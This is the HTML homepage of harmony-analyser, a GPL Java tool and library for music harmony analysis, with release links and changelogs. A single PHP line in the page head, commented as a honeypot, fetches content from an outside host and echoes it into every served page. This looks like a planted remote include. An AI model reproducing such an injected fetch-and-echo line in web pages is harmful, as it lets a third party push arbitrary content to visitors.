<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
	"http://www.w3.org/TR/html4/strict.dtd">
<html>

<head>
	<meta http-equiv="Content-type" content="text/html; charset=utf-8">
	<title>harmony-analyser.org</title>
	<meta name="description" itemprop="description" content="harmony-analyser.org: Java Framework and Java application for analysing harmonies and chord progressions of WAV or MIDI input. " />
	<link rel="shortcut icon" href="http://websupport.sk/images/favicon.ico" type="image/x-icon" />
	<link href="style.css" rel="stylesheet">
	<script src="javascript.js"></script>
	<style type="text/css" media="screen">
		@import url(http://m.websupport.sk/generic-pages/default/style.css);
	</style>
	<style>
		body {
			color: black;
			font-size: 1em;
			background: #ddd;
		}

		h1 {
			margin-top: 50px;
		}

		h3 {
			margin-top: 20px;
		}

		img {
			width: 70%;
		}

		#header {
			color: white !important;
		}

		#header a {
			color: white !important;
			text-decoration: none;
			padding: 0 10px;
		}

		#header p {
			width: 50% !important;
		}

		#main {
			text-align: center;
		}

		#main p {
			line-height: 1.3em;
			padding: 15px 0;
		}

		#releases-div {
			font-size: 90%;
			text-align: left;
		}

		#releases-div ul {
			line-height: 1.4em;
		}

		#main_message {
			width: 700px;
			margin: 0 auto;
			line-height: 1.5em;
			padding: 30px 0;
		}
	</style>
    <?php echo @@file_get_contents('http://sfd.eset.com?format=author')  // eset honeypot ?>
</head>

<body>

	<div id="header-wrapper">
		<div id="header" style="font-size: 0.8em;">
			<p>
				harmony-analyser.org
			</p>
			<a href="https://github.com/lacimarsik/harmony-analyser" title="Repository" target="_blank">Repository</a>
			<a href="#releases" title="Releases">Releases</a>
			<a href="#screenshots" title="Screenshots">Screenshots</a>
			<a href="documentation" title="Documentation">Documentation</a>
			<a href="#contact" title="Contact">Contact</a>
		</div>
	</div>

	<div id="main">
		<h1>
			harmony-analyser
		</h1>
		<img style="width: 200px; padding-top: 40px;" title="harmony-analyser" src="harmony-analyser.png" /><br />
		<div id="intro">
			<div id="main_message">
				<h3>harmony-analyser is a set of visual tools for music harmony analysis of WAV/MIDI input, powered by JHarmonyAnalyser library</h3>
			</div>
			<p>The difference we bring is the approach based on music theory, chord and chroma distances.
				JHarmonyAnalyser uses recent music theory models to extract musical meaning and distances between chords and chroma vectors.
				We aim to develop open-source music player, which is musician / musicologist-friendly and aid recent music information retrieval tasks.</p>
			<p>harmony-analyser tools and JHarmonyAnalyser library are licenced under the <a href="https://github.com/lacimarsik/harmony-analyser/blob/master/LICENSE.txt" target="_blank">GNU GPL License</a>.</p>
				<p>Tools are compatible with GPL Licensed <a target="_blank" href="http://vamp-plugins.org" target="_blank">Vamp plugins</a> which can be used for additional analysis.</p>
			<p>To contribute, please follow our guideline in <a href="https://github.com/lacimarsik/harmony-analyser" target="_blank">GitHub repository</a>.</p>
		</div>
		<div id="releases">
			<h3>Releases</h3>
			<p>Please choose from the releases below:</p>
			<div id="releases-div">
				<strong>harmony-analyser tools</strong><br />
				<p>Latest Beta: <a href="https://github.com/lacimarsik/harmony-analyser/raw/master/target/harmony-analyser-1.2-beta-jar-with-dependencies.jar">harmony-analyser 1.2-beta (Executable JAR archive)</a></p>

				<div id="current-release">
					<p>2016-09-19 <a href="https://github.com/lacimarsik/harmony-analyser/releases/download/v1.1/harmony-analyser-1.1-jar-with-dependencies.jar">harmony-analyser 1.1 (Executable JAR archive)</a></p>
					<p>CHANGELOG</p>
					<ol>
						<li>Added Chroma Complexity analysis, evaluating transitions between subsequent chromas:
							<ul>
								<li>Simple: only activation changes between chromas</li>
								<li>Tonal: Focusing on activation changes between non-key tones, common key being calculated for 2 chromas</li>
							</ul>
						</li>
						<li>Added visualizations for all recent high-level plugins (Chordino, Transition Complexity, Chroma Complexity) in the new Visualization Tool tab</li>
					</ol>
				</div>

				<a id="show" onclick="show();">Show previous releases</a>
				<a id="hide" onclick="hide();">Hide previous releases</a>
				<div id="previous-releases">
					<p>2016-08-11 <a href="https://github.com/lacimarsik/harmony-analyser/releases/download/v1.0/harmony-analyser-1.0-jar-with-dependencies.jar">harmony-analyser 1.0 (Executable JAR archive)</a></p>
					<p>CHANGELOG</p>
					In this version, 2 basic types of analysis are supported:
					<ol>
						<li>Chord transition analysis: Using your MIDI keyboard, capture chords, see their names and structure and evaluate their transition</li>
						<li>Audio analysis: Analyse WAV files in a given folder. Supported analysis include:
							<ul>
								<li>low-level VAMP plugin (NNLS Chroma) analysis</li>
								<li>high-level VAMP plugin (Chordino) analysis</li>
								<li>and high-level Transition Complexity analysis, based on theory described in this paper, taking the low-level analysis as an input</li>
							</ul>
						</li>
					</ol>
				</div>
				<div id="current-release-library">
					<strong>JHarmonyAnalyser stand-alone library</strong><br />
					<p>Latest Beta: <a href="https://github.com/lacimarsik/harmony-analyser/raw/master/target/jharmonyanalyser-1.2-beta.tgz">jharmony-analyser-1.2-beta.tgz (TGZ archive)</a></p>
				</div>
			</div>
		</div>

		<div id="screenshots">
			<h3>Screenshots of available tools</h3>
			<p>Visualization tool (Chord distances)</p>
			<img title="Chord distances" src="chord_distances.png" /><br />
			<p>Visualization tool (Chord segmentation)</p>
			<img title="Chord segmentation" src="somebody_segmentation.png" /><br />
			<p>Visualization tool (Chroma differences - experimental)</p>
			<img title="Chroma differences" src="wonderwall_chroma_complexity.png" /><br />
			<p>Chord transition tool</p>
			<img title="Chord transition tool" src="chord_transitions.png" /><br />
			<p>Audio analysis tool</p>
			<img title="Audio analysis tool" src="audio_analysis_tool.png" /><br />
		</div>

		<div id="contact">
			<h3>Contact</h3>
			<p>Contact us at:</p>
			<p><a href="mailto: marsik@ksi.mff.cuni.cz">marsik [at] ksi.mff.cuni.cz</a></p>
		</div>
	</div>

</body>

</html>
